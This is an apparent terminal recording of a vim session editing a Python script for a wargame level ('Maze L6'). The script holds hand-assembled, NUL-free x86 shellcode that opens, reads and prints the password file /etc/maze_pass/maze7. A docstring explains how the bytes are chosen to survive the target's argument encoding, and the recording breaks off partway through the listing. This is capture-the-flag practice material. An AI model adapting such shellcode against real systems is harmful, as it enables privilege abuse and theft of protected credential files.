[7.138422, "o", "\u001b[1;1H\u001b[34m#!/usr/bin/env python3\u001b[m\r\r\n\u001b[31m\"\"\"Maze L6 shellcode: open/read/write /etc/maze_pass/maze7 (NUL-free, no '*').\u001b[m\u001b[2;79H\u001b[K\u001b[3;1H\u001b[K\u001b[4;1H\u001b[31mPath built on the stack via pushes (NUL via a pre-push of eax); read into a\r\r\nbuffer allocated below the strings (sub esp); written to fd 1; exit.\r\r\nAvoids NUL and '*' (0x2a) in every byte (argv[2] must be NUL-free, and a raw\r\r\n0x2a would become NUL in argv[2] via the frob encoding).\r\r\n\"\"\"\u001b[m\r\r\n\u001b[35mimport\u001b[m sys\r\r\n\r\r\nsc = \u001b[36mbytes\u001b[m([\r\r\n    \u001b[31m0x31\u001b[m, \u001b[31m0xC0\u001b[m,\u001b[23C\u001b[34m# xor eax, eax\u001b[m\r\r\n    \u001b[31m0x50\u001b[m,\u001b[29C\u001b[34m# push eax            (NUL terminator for path)\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x61\u001b[m, \u001b[31m0x7A\u001b[m, \u001b[31m0x65\u001b[m, \u001b[31m0x37\u001b[m,     \u001b[34m# push \"aze7\"\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x73\u001b[m, \u001b[31m0x73\u001b[m, \u001b[31m0x2F\u001b[m, \u001b[31m0x6D\u001b[m,     \u001b[34m# push \"ss/m\"\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x65\u001b[m, \u001b[31m0x5F\u001b[m, \u001b[31m0x70\u001b[m, \u001b[31m0x61\u001b[m,     \u001b[34m# push \"e_pa\"\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x2F\u001b[m, \u001b[31m0x6D\u001b[m, \u001b[31m0x61\u001b[m, \u001b[31m0x7A\u001b[m,     \u001b[34m# push \"/maz\"\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x2F\u001b[m, \u001b[31m0x65\u001b[m, \u001b[31m0x74\u001b[m, \u001b[31m0x63\u001b[m,     \u001b[34m# push \"/etc\"\u001b[m\r\r\n    \u001b[31m0x89\u001b[m, \u001b[31m0xE3\u001b[m,\u001b[23C\u001b[34m# mov ebx, esp        (path)\u001b[m\r\r\n    \u001b[31m0x31\u001b[m, \u001b[31m0xC9\u001b[m,\u001b[23C\u001b[34m# xor ecx, ecx        (O_RDONLY)\u001b[m\r\r\n    \u001b[31m0xB0\u001b[m, \u001b[31m0x05\u001b[m,\u001b[23C\u001b[34m# mov al, 5           (open)\u001b[m\r\r\n    \u001b[31m0xCD\u001b[m, \u001b[31m0x80\u001b[m,\u001b[23C\u001b[34m# int 0x80\u001b[m\r\r\n    \u001b[31m0x89\u001b[m, \u001b[31m0xC3\u001b[m,\u001b[23C\u001b[34m# mov ebx, eax        (fd)\u001b[m\r\r\n    \u001b[31m0x83\u001b[m, \u001b[31m0xEC\u001b[m, \u001b[31m0x20\u001b[m,\u001b[17C\u001b[34m# sub esp, 0x20       (buffer)\u001b[m\r\r\n    \u001b[31m0x89\u001b[m, \u001b[31m0xE1\u001b[m,\u001b[23C\u001b[34m# mov ecx, esp        (buf)\u001b[m\r\r\n    \u001b[31m0x31\u001b[m, \u001b[31m0xD2\u001b[m,\u001b[23C\u001b[34m# xor edx, edx\u001b[m\r\r\n    \u001b[31m0xB2\u001b[m, \u001b[31m0x0F\u001b[m,\u001b[23C\u001b[34m# mov dl, 15          (count)\u001b[m\r\r\n    \u001b[31m0xB0\u001b[m, \u001b[31m0x03\u001b[m,\u001b[23C\u001b[34m# mov al, 3           (read)\u001b[m\r\r\n    \u001b[31m0xCD\u001b[m, \u001b[31m0x80\u001b[m,\u001b[23C\u001b[34m# int 0x80\u001b[m\r\r\n    \u001b[31m0x31\u001b[m, \u001b[31m0xDB\u001b[m,\u001b[23C\u001b[34m# xor ebx, ebx"]
[7.167366, "o", "\u001b[m\r\r\n    \u001b[31m0xB3\u001b[m, \u001b[31m0x01\u001b[m,\u001b[23C\u001b[34m# mov bl, 1           (fd 1)\u001b[m\r\r\n    \u001b[31m0x89\u001b[m, \u001b[31m0xE1\u001b[m,\u001b[23C\u001b[34m# mov ecx, esp        (buf)\u001b[m\r\r\n    \u001b[31m0x89\u001b[m, \u001b[31m0xC2\u001b[m,\u001b[23C\u001b[34m# mov edx, eax        (nread)\u001b[m\u001b[34;93H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
[36.028448, "o", "\u001b[?25l\u001b[34;83H^[\u001b[1;1H\u001b[34;83H  \u001b[1;1H\u001b[34;83H^[\u001b[1;1H\u0007\u001b[34;83H  \u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;1H\u001b[K\u001b[34;1H:set noai nocin nosi indentexpr=\r\u001b[92C1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[34;83HdG\u001b[1;1H\u001b[34;83H  \u001b[1;1H\u001b[1;1H\u001b[K\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                             \u001b[3;1H~                                                                                                             \u001b[4;1H~                                                                                                             \u001b[5;1H~                                                                                                             \u001b[6;1H~                                                                                                             \u001b[7;1H~                                                                                                             \u001b[8;1H~                                                                                                             \u001b[9;1H~                                                                                                             \u001b[10;1H~                                                                                                             \u001b[11;1H~                                                                                                             \u001b[12;1H~                                                                                                             \u001b[13;1H~                                                                                                             \u001b[14;1H~                                                                                                             \u001b[15;1H~                                 